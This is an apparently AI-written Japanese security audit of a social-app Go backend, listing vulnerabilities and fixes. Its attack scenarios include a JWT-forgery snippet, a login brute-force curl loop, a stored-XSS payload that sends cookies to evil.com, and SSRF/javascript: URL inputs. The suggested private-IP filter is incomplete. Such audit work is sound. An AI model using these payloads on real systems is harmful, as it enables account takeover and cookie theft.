# 🔐 セキュリティ調査レポート - Phase 1 開発

**プロジェクト**: TwitterライクSNSアプリケーション
**調査日**: 2026-02-15
**対象フェーズ**: Phase 1 (MVP) - コア機能実装
**調査範囲**: バックエンドAPI (Go + Echo + GORM)
**調査者**: Claude Code Security Analysis

---

## 📋 エグゼクティブサマリー

Phase 1 (MVP) 開発段階のコードベースに対してセキュリティ調査を実施しました。**25個の重要なセキュリティリスク**を特定しました。

現在のコードは**開発環境としては機能します**が、**本番環境にデプロイする前に多くのセキュリティ強化が必要**です。特に認証機構、レート制限、入力サニタイゼーションに関する緊急対応が求められます。

### リスクレベル分布

| レベル | 件数 | 説明 |
|--------|------|------|
| 🔴 **Critical（緊急）** | 5件 | 即座に対応が必要。システム全体のセキュリティに影響 |
| 🟠 **High（高）** | 8件 | 本番デプロイ前に必ず対応が必要 |
| 🟡 **Medium（中）** | 7件 | Phase 2 までに対応推奨 |
| 🟢 **Low（低）** | 5件 | 優先度低いが改善推奨 |

### 総合セキュリティスコア

```
総合スコア: 4.2/10 (要改善)

認証・認可:      ████░░░░░░  4/10 ⚠️
入力検証:        █████░░░░░  5/10 ⚠️
データ保護:      █████░░░░░  5/10 ⚠️
API セキュリティ: ███░░░░░░░  3/10 ❌
インフラ:        ████░░░░░░  4/10 ⚠️
```

---

## 🔴 Critical（緊急対応が必要）

### 1. JWT Secret がデフォルト値のまま

**重要度**: 🔴 Critical
**Phase**: Phase 1
**影響範囲**: 認証システム全体

#### 問題のあるコード

**ファイル**: `backend/.env:6`, `docker-compose.yml:37`

```env
# backend/.env
JWT_SECRET=your-secret-key-change-this-in-production
```

```yaml
# docker-compose.yml
environment:
  JWT_SECRET: your-secret-key-change-this-in-production
```

#### リスク

- 攻撃者がJWTトークンを簡単に偽造できる
- 任意のユーザーとして認証可能
- システム全体の認証が無効化される
- 実際のパスワードなしでアカウント乗っ取りが可能

#### 攻撃シナリオ

```python
# 攻撃者がJWTを偽造
import jwt

fake_token = jwt.encode(
    {"user_id": 1, "exp": 9999999999},
    "your-secret-key-change-this-in-production",  # 公開されている
    algorithm="HS256"
)
# → 管理者として認証成功
```

#### 推奨対策

```bash
# 1. 強力なランダムシークレットを生成
openssl rand -base64 64

# 2. .envファイルを更新
JWT_SECRET=<生成された64文字のランダム文字列>

# 3. .envファイルを.gitignoreに追加（既に追加済みか確認）
echo ".env" >> .gitignore

# 4. 本番環境では環境変数として設定
# Render/Cloud Run/Vercelなどで環境変数を設定
```

#### コード修正

`backend/internal/config/config.go:36`
```go
// 修正前
JWTSecret: getEnv("JWT_SECRET", "secret"),

// 修正後
jwtSecret := getEnv("JWT_SECRET", "")
if jwtSecret == "" {
    log.Fatal("❌ JWT_SECRET environment variable is required")
}
config := &Config{
    // ...
    JWTSecret: jwtSecret,
    // ...
}
```

**対応期限**: Phase 1 完了前に必須

---

### 2. レート制限が実装されていない

**重要度**: 🔴 Critical
**Phase**: Phase 1
**影響範囲**: 全エンドポイント

#### 問題

現在、すべてのAPIエンドポイントでレート制限が実装されていません。

**影響を受けるエンドポイント**:
- `POST /api/v1/auth/login` - ブルートフォース攻撃
- `POST /api/v1/auth/register` - スパム登録
- `POST /api/v1/posts` - スパム投稿
- その他すべてのエンドポイント

#### リスク

1. **ブルートフォース攻撃**: パスワード推測攻撃が可能
2. **DDoS攻撃**: サービス停止
3. **スパム投稿**: データベース容量圧迫
4. **APIリソース枯渇**: サーバーコスト増加

#### 攻撃シナリオ

```bash
# ブルートフォース攻撃の例
for password in common_passwords.txt; do
  curl -X POST http://api/auth/login \
    -d "{\"email\":\"admin@example.com\",\"password\":\"$password\"}"
done
# → 無制限に試行可能
```

#### 推奨対策

**ライブラリのインストール**:
```bash
docker compose exec api go get github.com/ulule/limiter/v3
docker compose exec api go get github.com/ulule/limiter/v3/drivers/store/memory
```

**実装例**:

`backend/internal/middleware/rate_limit.go` (新規作成)
```go
package middleware

import (
    "github.com/labstack/echo/v4"
    "github.com/ulule/limiter/v3"
    "github.com/ulule/limiter/v3/drivers/middleware/stdlib"
    "github.com/ulule/limiter/v3/drivers/store/memory"
    "github.com/yourusername/sns-backend/internal/utils"
)

// RateLimitConfig - レート制限設定
type RateLimitConfig struct {
    Rate   limiter.Rate
    Name   string
}

// NewRateLimit - レート制限ミドルウェア作成
func NewRateLimit(rate limiter.Rate) echo.MiddlewareFunc {
    store := memory.NewStore()
    instance := limiter.New(store, rate)

    return func(next echo.HandlerFunc) echo.HandlerFunc {
        return func(c echo.Context) error {
            // IPアドレスをキーとして使用
            key := c.RealIP()

            context, err := instance.Get(c.Request().Context(), key)
            if err != nil {
                return utils.ErrorResponse(c, 500, "Rate limit error")
            }

            // レート制限超過チェック
            if context.Reached {
                return utils.ErrorResponse(c, 429, "Too many requests. Please try again later.")
            }

            return next(c)
        }
    }
}

// 推奨レート制限
var (
    // 認証系: 5回/5分
    AuthRateLimit = NewRateLimit(limiter.Rate{
        Period: 5 * time.Minute,
        Limit:  5,
    })

    // 投稿作成: 10回/分
    PostCreateRateLimit = NewRateLimit(limiter.Rate{
        Period: 1 * time.Minute,
        Limit:  10,
    })

    // 一般API: 100回/分
    GeneralRateLimit = NewRateLimit(limiter.Rate{
        Period: 1 * time.Minute,
        Limit:  100,
    })
)
```

**ルートへの適用**:

`backend/internal/routes/routes.go`
```go
package routes

import (
    "github.com/labstack/echo/v4"
    "github.com/yourusername/sns-backend/internal/handlers"
    "github.com/yourusername/sns-backend/internal/middleware"
)

func SetupRoutes(e *echo.Echo) {
    api := e.Group("/api/v1")

    // 認証ルート（厳格なレート制限）
    auth := api.Group("/auth")
    {
        auth.POST("/register", handlers.Register, middleware.AuthRateLimit)
        auth.POST("/login", handlers.Login, middleware.AuthRateLimit)
        auth.GET("/me", handlers.GetMe, middleware.JWTAuth())
    }

    // 投稿ルート
    posts := api.Group("/posts")
    {
        posts.GET("", handlers.GetTimeline, middleware.GeneralRateLimit, middleware.OptionalJWTAuth())
        posts.POST("", handlers.CreatePost, middleware.PostCreateRateLimit, middleware.JWTAuth())
        // ...
    }
}
```

**対応期限**: Phase 1 完了前に必須

---

### 3. エラーメッセージで内部情報が漏洩

**重要度**: 🔴 Critical
**Phase**: Phase 1
**影響範囲**: エラーハンドリング全体

#### 問題のあるコード

**ファイル**: `backend/internal/middleware/error_middleware.go:21`

```go
func ErrorHandler(err error, c echo.Context) {
    code := http.StatusInternalServerError
    message := "Internal Server Error"

    if he, ok := err.(*echo.HTTPError); ok {
        code = he.Code
        message = he.Message.(string)
    }

    // ⚠️ 問題: 詳細なエラーがログに出力される
    log.Printf("Error: %v", err)

    if !c.Response().Committed {
        c.JSON(code, map[string]interface{}{
            "error": map[string]interface{}{
                "message": message,  // ⚠️ 内部情報が含まれる可能性
            },
        })
    }
}
```

#### リスク

エラーメッセージに以下の情報が含まれる可能性:
- データベーススキーマ情報
- ファイルパス
- スタックトレース
- 内部ロジック
- 使用しているライブラリのバージョン

#### 攻撃シナリオ

```bash
# 攻撃者が意図的に不正なリクエストを送信
curl -X POST http://api/posts/invalid \
  -H "Authorization: Bearer malformed_token"

# レスポンス例（本番環境で危険）:
{
  "error": {
    "message": "pq: syntax error at or near \"SELECT\" at character 45"
    # → データベースクエリ構造が露呈
  }
}
```

#### 推奨対策

`backend/internal/middleware/error_middleware.go`
```go
package middleware

import (
    "log"
    "net/http"

    "github.com/labstack/echo/v4"
    "github.com/yourusername/sns-backend/internal/config"
)

func ErrorHandler(err error, c echo.Context) {
    code := http.StatusInternalServerError
    message := "Internal Server Error"

    if he, ok := err.(*echo.HTTPError); ok {
        code = he.Code
        if msg, ok := he.Message.(string); ok {
            message = msg
        }
    }

    // 本番環境では詳細を隠す
    if config.AppConfig.Env == "production" {
        // サーバー側のログには詳細を記録
        log.Printf("[ERROR] Path: %s, Method: %s, IP: %s, Error: %v",
            c.Request().URL.Path,
            c.Request().Method,
            c.RealIP(),
            err,
        )

        // クライアントには一般的なメッセージのみ
        if code >= 500 {
            message = "An internal error occurred. Please try again later."
        }
    } else {
        // 開発環境では詳細を表示
        log.Printf("Error: %v", err)
    }

    if !c.Response().Committed {
        if c.Request().Method == echo.HEAD {
            c.NoContent(code)
        } else {
            c.JSON(code, map[string]interface{}{
                "error": map[string]interface{}{
                    "message": message,
                },
            })
        }
    }
}
```

**対応期限**: Phase 1 完了前に必須

---

### 4. ユーザー入力のサニタイゼーション不足（XSS リスク）

**重要度**: 🔴 Critical
**Phase**: Phase 1
**影響範囲**: 投稿、コメント、プロフィール

#### 問題のあるコード

**ファイル**: `backend/internal/handlers/post_handler.go:119-136`

```go
func CreatePost(c echo.Context) error {
    var req CreatePostRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    if err := utils.ValidateStruct(req); err != nil {
        return utils.ErrorResponse(c, 400, err.Error())
    }

    userID := c.Get("user_id").(uint)

    // ⚠️ 問題: HTMLタグがそのまま保存される
    post, err := services.CreatePost(userID, req.Content)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to create post")
    }

    return utils.SuccessResponse(c, 201, post)
}
```

同様の問題が以下にも存在:
- `backend/internal/handlers/comment_handler.go` - コメント作成
- `backend/internal/handlers/user_handler.go` - プロフィール更新

#### リスク

**Stored XSS（格納型XSS）攻撃**により:
- 他のユーザーのセッションを乗っ取り
- 個人情報の窃取
- フィッシングサイトへのリダイレクト
- 悪意のあるコードの実行

#### 攻撃シナリオ

```bash
# 攻撃者が悪意のある投稿を作成
curl -X POST http://api/posts \
  -H "Authorization: Bearer <token>" \
  -d '{
    "content": "Check this out! <script>fetch(\"https://evil.com?cookie=\"+document.cookie)</script>"
  }'

# この投稿を見た他のユーザーのCookieが盗まれる
```

#### 推奨対策

**方法1: HTMLエスケープ（推奨）**

`backend/internal/handlers/post_handler.go`
```go
import "html"

func CreatePost(c echo.Context) error {
    var req CreatePostRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    if err := utils.ValidateStruct(req); err != nil {
        return utils.ErrorResponse(c, 400, err.Error())
    }

    userID := c.Get("user_id").(uint)

    // HTMLエスケープ
    sanitizedContent := html.EscapeString(req.Content)

    post, err := services.CreatePost(userID, sanitizedContent)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to create post")
    }

    return utils.SuccessResponse(c, 201, post)
}
```

**方法2: サニタイゼーションライブラリ（より安全）**

```bash
docker compose exec api go get github.com/microcosm-cc/bluemonday
```

`backend/internal/utils/sanitize.go` (新規作成)
```go
package utils

import (
    "github.com/microcosm-cc/bluemonday"
)

var (
    // 厳格なポリシー: すべてのHTMLを除去
    StrictPolicy = bluemonday.StrictPolicy()

    // 緩いポリシー: 安全なHTMLのみ許可（リンク、太字など）
    UGCPolicy = bluemonday.UGCPolicy()
)

// SanitizeText - テキストをサニタイズ
func SanitizeText(text string) string {
    return StrictPolicy.Sanitize(text)
}

// SanitizeHTML - 安全なHTMLのみ許可
func SanitizeHTML(html string) string {
    return UGCPolicy.Sanitize(html)
}
```

使用例:
```go
import "github.com/yourusername/sns-backend/internal/utils"

func CreatePost(c echo.Context) error {
    // ...
    sanitizedContent := utils.SanitizeText(req.Content)
    post, err := services.CreatePost(userID, sanitizedContent)
    // ...
}
```

**同様の修正が必要な箇所**:
- ✅ `handlers/comment_handler.go:CreateComment()`
- ✅ `handlers/user_handler.go:UpdateProfile()` - Bio, DisplayName, Website

**対応期限**: Phase 1 完了前に必須

---

### 5. 型アサーションでのパニックリスク

**重要度**: 🔴 Critical
**Phase**: Phase 1
**影響範囲**: 全ハンドラー

#### 問題のあるコード

多数のハンドラーで以下のパターンが使用されています:

**例**: `backend/internal/handlers/post_handler.go:129`
```go
func CreatePost(c echo.Context) error {
    // ...
    userID := c.Get("user_id").(uint)  // ⚠️ パニックの可能性
    // ...
}
```

同様の問題がある箇所:
- `handlers/auth_handler.go:136`
- `handlers/comment_handler.go` (複数箇所)
- `handlers/like_handler.go` (複数箇所)
- `handlers/follow_handler.go` (複数箇所)
- `handlers/user_handler.go:74`

#### リスク

- JWTミドルウェアが失敗した場合にサーバーがクラッシュ
- `user_id`が設定されていない場合にパニック
- 予期しないデータ型の場合にパニック
- DoS攻撃のベクトルになる可能性

#### 攻撃シナリオ

```bash
# ミドルウェアの処理順序が変わった場合や
# バグによりuser_idが設定されない場合
→ panic: interface conversion: interface {} is nil, not uint
→ サーバーがクラッシュ
```

#### 推奨対策

**方法1: 安全な型アサーション**

```go
func CreatePost(c echo.Context) error {
    var req CreatePostRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    if err := utils.ValidateStruct(req); err != nil {
        return utils.ErrorResponse(c, 400, err.Error())
    }

    // 安全な型アサーション
    userIDInterface := c.Get("user_id")
    if userIDInterface == nil {
        return utils.ErrorResponse(c, 401, "Unauthorized: user context not found")
    }

    userID, ok := userIDInterface.(uint)
    if !ok {
        return utils.ErrorResponse(c, 500, "Invalid user context type")
    }

    post, err := services.CreatePost(userID, req.Content)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to create post")
    }

    return utils.SuccessResponse(c, 201, post)
}
```

**方法2: ヘルパー関数作成（推奨）**

`backend/internal/utils/context.go` (新規作成)
```go
package utils

import (
    "errors"
    "github.com/labstack/echo/v4"
)

// GetUserIDFromContext - コンテキストから安全にユーザーIDを取得
func GetUserIDFromContext(c echo.Context) (uint, error) {
    userIDInterface := c.Get("user_id")
    if userIDInterface == nil {
        return 0, errors.New("user context not found")
    }

    userID, ok := userIDInterface.(uint)
    if !ok {
        return 0, errors.New("invalid user context type")
    }

    return userID, nil
}
```

使用例:
```go
import "github.com/yourusername/sns-backend/internal/utils"

func CreatePost(c echo.Context) error {
    var req CreatePostRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    if err := utils.ValidateStruct(req); err != nil {
        return utils.ErrorResponse(c, 400, err.Error())
    }

    // 安全な取得
    userID, err := utils.GetUserIDFromContext(c)
    if err != nil {
        return utils.ErrorResponse(c, 401, "Unauthorized")
    }

    post, err := services.CreatePost(userID, req.Content)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to create post")
    }

    return utils.SuccessResponse(c, 201, post)
}
```

**修正が必要な全ファイル**:
- ✅ `handlers/auth_handler.go`
- ✅ `handlers/post_handler.go`
- ✅ `handlers/comment_handler.go`
- ✅ `handlers/like_handler.go`
- ✅ `handlers/follow_handler.go`
- ✅ `handlers/user_handler.go`

**対応期限**: Phase 1 完了前に必須

---

## 🟠 High（高優先度）

### 6. CORS 設定が開発環境専用

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: API アクセス制御

#### 問題のあるコード

**ファイル**: `backend/internal/middleware/cors_middleware.go:11`

```go
func CORS() echo.MiddlewareFunc {
    return middleware.CORSWithConfig(middleware.CORSConfig{
        AllowOrigins: []string{"http://localhost:3000", "http://localhost:5173"},
        AllowMethods: []string{echo.GET, echo.POST, echo.PUT, echo.DELETE, echo.PATCH, echo.OPTIONS},
        AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept, echo.HeaderAuthorization},
    })
}
```

#### リスク

- 本番環境デプロイ時に動作しない
- ハードコードされたオリジンを`*`に変更すると全オリジンからアクセス可能になり危険
- クロスオリジンリクエスト保護が機能しない

#### 推奨対策

`backend/internal/middleware/cors_middleware.go`
```go
package middleware

import (
    "os"
    "strings"

    "github.com/labstack/echo/v4"
    "github.com/labstack/echo/v4/middleware"
    "github.com/yourusername/sns-backend/internal/config"
)

func CORS() echo.MiddlewareFunc {
    var allowedOrigins []string

    if config.AppConfig.Env == "production" {
        // 本番環境: 環境変数から取得
        originsStr := os.Getenv("ALLOWED_ORIGINS")
        if originsStr == "" {
            // デフォルトで本番ドメインを設定
            allowedOrigins = []string{"https://yourdomain.com"}
        } else {
            // カンマ区切りで複数指定可能
            allowedOrigins = strings.Split(originsStr, ",")
        }
    } else {
        // 開発環境
        allowedOrigins = []string{
            "http://localhost:3000",
            "http://localhost:5173",
        }
    }

    return middleware.CORSWithConfig(middleware.CORSConfig{
        AllowOrigins: allowedOrigins,
        AllowMethods: []string{
            echo.GET,
            echo.POST,
            echo.PUT,
            echo.DELETE,
            echo.PATCH,
            echo.OPTIONS,
        },
        AllowHeaders: []string{
            echo.HeaderOrigin,
            echo.HeaderContentType,
            echo.HeaderAccept,
            echo.HeaderAuthorization,
        },
        AllowCredentials: true,
        MaxAge:           3600,
    })
}
```

**環境変数設定例**:

`.env`
```env
ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
```

`docker-compose.yml` (本番環境)
```yaml
environment:
  ALLOWED_ORIGINS: https://yourdomain.com,https://app.yourdomain.com
```

**対応期限**: Phase 1 完了前 or デプロイ前

---

### 7. パスワードポリシーが弱い

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: ユーザー登録

#### 問題のあるコード

**ファイル**: `backend/internal/handlers/auth_handler.go:12`

```go
type RegisterRequest struct {
    Email    string `json:"email" validate:"required,email"`
    Password string `json:"password" validate:"required,min=8"`  // ⚠️ 8文字のみ
    Username string `json:"username" validate:"required,min=3,max=50"`
}
```

#### リスク

- 弱いパスワード（例: `12345678`）が許可される
- ブルートフォース攻撃の成功率が高い
- 辞書攻撃に脆弱
- セキュリティベストプラクティスに反する

#### 一般的な弱いパスワード例

```
12345678
password
abcdefgh
qwertyui
```

これらすべてが現在のバリデーションを通過します。

#### 推奨対策

**ステップ1**: カスタムバリデーター作成

`backend/internal/utils/validator.go`
```go
package utils

import (
    "regexp"
    "github.com/go-playground/validator/v10"
)

var validate *validator.Validate

func init() {
    validate = validator.New()

    // カスタムバリデーター登録
    validate.RegisterValidation("password_strength", ValidatePasswordStrength)
}

// ValidatePasswordStrength - パスワード強度検証
func ValidatePasswordStrength(fl validator.FieldLevel) bool {
    password := fl.Field().String()

    // 最低12文字
    if len(password) < 12 {
        return false
    }

    // 大文字を含む
    hasUpper := regexp.MustCompile(`[A-Z]`).MatchString(password)
    if !hasUpper {
        return false
    }

    // 小文字を含む
    hasLower := regexp.MustCompile(`[a-z]`).MatchString(password)
    if !hasLower {
        return false
    }

    // 数字を含む
    hasNumber := regexp.MustCompile(`[0-9]`).MatchString(password)
    if !hasNumber {
        return false
    }

    // 特殊文字を含む
    hasSpecial := regexp.MustCompile(`[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]`).MatchString(password)
    if !hasSpecial {
        return false
    }

    return true
}

// ValidateStruct - 構造体をバリデーション
func ValidateStruct(s interface{}) error {
    return validate.Struct(s)
}

// GetValidator - バリデータインスタンスを取得
func GetValidator() *validator.Validate {
    return validate
}
```

**ステップ2**: リクエスト構造体更新

`backend/internal/handlers/auth_handler.go`
```go
type RegisterRequest struct {
    Email    string `json:"email" validate:"required,email"`
    Password string `json:"password" validate:"required,min=12,password_strength"`
    Username string `json:"username" validate:"required,min=3,max=50,alphanum"`
}
```

**ステップ3**: エラーメッセージ改善

```go
func Register(c echo.Context) error {
    var req RegisterRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    // バリデーション
    if err := utils.ValidateStruct(req); err != nil {
        // カスタムエラーメッセージ
        if strings.Contains(err.Error(), "password_strength") {
            return utils.ErrorResponse(c, 400,
                "Password must be at least 12 characters and include uppercase, lowercase, number, and special character")
        }
        return utils.ErrorResponse(c, 400, err.Error())
    }

    // ...
}
```

**追加推奨**: よくあるパスワードのブラックリスト

```go
var CommonPasswords = []string{
    "password", "12345678", "123456789", "qwerty", "abc123",
    // ... (Top 10,000 common passwords)
}

func IsCommonPassword(password string) bool {
    for _, common := range CommonPasswords {
        if strings.EqualFold(password, common) {
            return true
        }
    }
    return false
}
```

**対応期限**: Phase 1 完了前

---

### 8. JWT 有効期限が長すぎる

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: 認証システム

#### 問題のあるコード

**ファイル**: `backend/internal/utils/jwt.go:21`

```go
func GenerateToken(userID uint) (string, error) {
    claims := JWTClaims{
        UserID: userID,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)), // ⚠️ 24時間
            IssuedAt:  jwt.NewNumericDate(time.Now()),
        },
    }
    // ...
}
```

#### リスク

- トークンが盗まれた場合、24時間悪用される
- トークンの無効化（ログアウト）ができない
- セキュリティベストプラクティスに反する（推奨: 15分）

#### 推奨対策

**Phase 1 での簡易対応**: 有効期限を短縮

```go
// 15分に短縮
ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),
```

**Phase 2 での本格対応**: リフレッシュトークン実装

`backend/internal/models/refresh_token.go` (新規作成)
```go
package models

import (
    "time"
    "gorm.io/gorm"
)

type RefreshToken struct {
    ID        uint           `gorm:"primarykey" json:"id"`
    UserID    uint           `gorm:"not null;index" json:"user_id"`
    Token     string         `gorm:"uniqueIndex;not null" json:"token"`
    ExpiresAt time.Time      `gorm:"not null" json:"expires_at"`
    CreatedAt time.Time      `json:"created_at"`
    RevokedAt *time.Time     `json:"revoked_at"`
    DeletedAt gorm.DeletedAt `gorm:"index" json:"-"`

    // リレーション
    User User `gorm:"foreignKey:UserID" json:"-"`
}
```

`backend/internal/utils/jwt.go`
```go
// GenerateTokenPair - アクセストークンとリフレッシュトークンを生成
func GenerateTokenPair(userID uint) (accessToken string, refreshToken string, err error) {
    // アクセストークン: 15分
    accessClaims := JWTClaims{
        UserID: userID,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, accessClaims)
    accessToken, err = token.SignedString([]byte(config.AppConfig.JWTSecret))
    if err != nil {
        return "", "", err
    }

    // リフレッシュトークン: 7日間（データベースに保存）
    refreshToken = generateRandomToken()

    return accessToken, refreshToken, nil
}

func generateRandomToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}
```

**新規エンドポイント**:

```go
// POST /api/v1/auth/refresh
// リフレッシュトークンで新しいアクセストークンを取得

func RefreshToken(c echo.Context) error {
    var req struct {
        RefreshToken string `json:"refresh_token" validate:"required"`
    }

    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request")
    }

    // リフレッシュトークン検証
    // 新しいアクセストークン発行
    // ...
}
```

**Phase 1 対応**: 有効期限を15分に短縮
**Phase 2 対応**: リフレッシュトークン実装

**対応期限**: Phase 1 で簡易対応、Phase 2 で本格実装

---

### 9. URL バリデーションが不十分

**重要度**: 🟠 High
**Phase**: Phase 1
**影響範囲**: プロフィール更新

#### 問題のあるコード

**ファイル**: `backend/internal/handlers/user_handler.go:11-20`

```go
type UpdateProfileRequest struct {
    DisplayName *string `json:"display_name"`
    Bio         *string `json:"bio"`
    AvatarURL   *string `json:"avatar_url"`   // ⚠️ バリデーションなし
    HeaderURL   *string `json:"header_url"`   // ⚠️ バリデーションなし
    Website     *string `json:"website"`      // ⚠️ バリデーションなし
    BirthDate   *string `json:"birth_date"`
    Occupation  *string `json:"occupation"`
}
```

#### リスク

1. **SSRF (Server-Side Request Forgery)**
```json
{
  "avatar_url": "file:///etc/passwd"
}
```

2. **Open Redirect**
```json
{
  "website": "javascript:alert('XSS')"
}
```

3. **フィッシング**
```json
{
  "website": "http://evil-site-that-looks-like-twitter.com"
}
```

#### 推奨対策

**ステップ1**: カスタムバリデーター作成

`backend/internal/utils/validator.go`
```go
import (
    "net/url"
    "strings"
)

func init() {
    validate = validator.New()
    validate.RegisterValidation("password_strength", ValidatePasswordStrength)
    validate.RegisterValidation("http_url", ValidateHTTPURL)
    validate.RegisterValidation("safe_url", ValidateSafeURL)
}

// ValidateHTTPURL - HTTPまたはHTTPSのみ許可
func ValidateHTTPURL(fl validator.FieldLevel) bool {
    urlStr := fl.Field().String()
    if urlStr == "" {
        return true // 空は許可（omitemptyと併用）
    }

    u, err := url.Parse(urlStr)
    if err != nil {
        return false
    }

    // http, https のみ許可
    scheme := strings.ToLower(u.Scheme)
    if scheme != "http" && scheme != "https" {
        return false
    }

    // file://, javascript:, data: などを拒否
    return true
}

// ValidateSafeURL - より厳格なURL検証
func ValidateSafeURL(fl validator.FieldLevel) bool {
    if !ValidateHTTPURL(fl) {
        return false
    }

    urlStr := fl.Field().String()
    u, _ := url.Parse(urlStr)

    // localhostを拒否（SSRF対策）
    host := strings.ToLower(u.Hostname())
    if host == "localhost" || host == "127.0.0.1" || strings.HasPrefix(host, "192.168.") {
        return false
    }

    // 内部IPアドレスを拒否
    if strings.HasPrefix(host, "10.") || strings.HasPrefix(host, "172.16.") {
        return false
    }

    return true
}
```

**ステップ2**: リクエスト構造体更新

```go
type UpdateProfileRequest struct {
    DisplayName *string `json:"display_name" validate:"omitempty,max=50"`
    Bio         *string `json:"bio" validate:"omitempty,max=160"`
    AvatarURL   *string `json:"avatar_url" validate:"omitempty,url,http_url,safe_url,max=500"`
    HeaderURL   *string `json:"header_url" validate:"omitempty,url,http_url,safe_url,max=500"`
    Website     *string `json:"website" validate:"omitempty,url,http_url,max=500"`
    BirthDate   *string `json:"birth_date" validate:"omitempty,datetime=2006-01-02"`
    Occupation  *string `json:"occupation" validate:"omitempty,max=100"`
}
```

**ステップ3**: エラーメッセージ改善

```go
func UpdateProfile(c echo.Context) error {
    var req UpdateProfileRequest
    if err := c.Bind(&req); err != nil {
        return utils.ErrorResponse(c, 400, "Invalid request body")
    }

    // バリデーション
    if err := utils.ValidateStruct(req); err != nil {
        if strings.Contains(err.Error(), "http_url") || strings.Contains(err.Error(), "safe_url") {
            return utils.ErrorResponse(c, 400, "Invalid URL format. Only http:// and https:// are allowed.")
        }
        return utils.ErrorResponse(c, 400, err.Error())
    }

    // ...
}
```

**対応期限**: Phase 1 完了前

---

### 10. ファイルアップロード機能のセキュリティ（準備段階）

**重要度**: 🟠 High
**Phase**: Phase 1 (準備中)
**影響範囲**: メディアアップロード機能

#### 現状

**ファイル**: `backend/internal/models/media.go`

メディアモデルは定義されていますが、ファイルアップロード機能はまだ実装されていません。

```go
type Media struct {
    ID         uint      `gorm:"primarykey" json:"id"`
    PostID     uint      `gorm:"not null;index" json:"post_id"`
    MediaType  string    `gorm:"type:varchar(20);not null" json:"media_type"`
    MediaURL   string    `gorm:"type:varchar(500);not null" json:"media_url"`
    FileSize   int64     `gorm:"not null" json:"file_size"`
    Duration   *int      `json:"duration"`
    OrderIndex int       `gorm:"default:0" json:"order_index"`
    CreatedAt  time.Time `json:"created_at"`
}
```

#### 将来の実装時に必要なセキュリティ対策

**Phase 2 実装時のチェックリスト**:

```go
// ✅ 必須のセキュリティチェック項目

// 1. ファイルサイズ制限
const (
    MaxImageSize = 5 * 1024 * 1024   // 5MB
    MaxVideoSize = 50 * 1024 * 1024  // 50MB
)

// 2. ファイル拡張子ホワイトリスト
var AllowedImageExtensions = []string{".jpg", ".jpeg", ".png", ".gif", ".heic"}
var AllowedVideoExtensions = []string{".mp4", ".mov"}

// 3. MIMEタイプ検証（マジックバイト確認）
func ValidateMIMEType(file multipart.File) (string, error) {
    buffer := make([]byte, 512)
    _, err := file.Read(buffer)
    if err != nil {
        return "", err
    }

    contentType := http.DetectContentType(buffer)

    // 拡張子とMIMEタイプの一致を確認
    allowedTypes := []string{
        "image/jpeg", "image/png", "image/gif",
        "video/mp4", "video/quicktime",
    }

    for _, allowed := range allowedTypes {
        if contentType == allowed {
            return contentType, nil
        }
    }

    return "", errors.New("invalid file type")
}

// 4. ファイル名サニタイゼーション
func SanitizeFilename(filename string) string {
    // UUIDを使用して安全なファイル名を生成
    ext := filepath.Ext(filename)
    safeExt := strings.ToLower(ext)

    uuid := uuid.New().String()
    return uuid + safeExt
}

// 5. パストラバーサル対策
func SecurePath(basePath, filename string) (string, error) {
    fullPath := filepath.Join(basePath, filename)

    // ベースパスの外に出ないことを確認
    if !strings.HasPrefix(fullPath, basePath) {
        return "", errors.New("invalid file path")
    }

    return fullPath, nil
}

// 6. ウイルススキャン（Phase 3 推奨）
// ClamAVなどのウイルススキャナーと統合

// 7. 画像メタデータ削除（EXIF削除）
// GPSデータなど個人情報を含むメタデータを削除
```

**実装例**:

```go
// handlers/media_handler.go
func UploadMedia(c echo.Context) error {
    // ファイル取得
    file, err := c.FormFile("file")
    if err != nil {
        return utils.ErrorResponse(c, 400, "No file uploaded")
    }

    // 1. サイズチェック
    if file.Size > MaxImageSize {
        return utils.ErrorResponse(c, 400, "File too large (max 5MB)")
    }

    // 2. 拡張子チェック
    ext := strings.ToLower(filepath.Ext(file.Filename))
    if !contains(AllowedImageExtensions, ext) {
        return utils.ErrorResponse(c, 400, "Invalid file type")
    }

    // 3. MIMEタイプチェック
    src, err := file.Open()
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to open file")
    }
    defer src.Close()

    mimeType, err := ValidateMIMEType(src)
    if err != nil {
        return utils.ErrorResponse(c, 400, "Invalid file format")
    }

    // 4. 安全なファイル名生成
    safeFilename := SanitizeFilename(file.Filename)

    // 5. 安全なパス生成
    uploadPath := "./uploads"
    safePath, err := SecurePath(uploadPath, safeFilename)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Invalid file path")
    }

    // 6. ファイル保存
    dst, err := os.Create(safePath)
    if err != nil {
        return utils.ErrorResponse(c, 500, "Failed to save file")
    }
    defer dst.Close()

    src.Seek(0, 0) // ファイルポインタをリセット
    if _, err = io.Copy(dst, src); err != nil {
        return utils.ErrorResponse(c, 500, "Failed to save file")
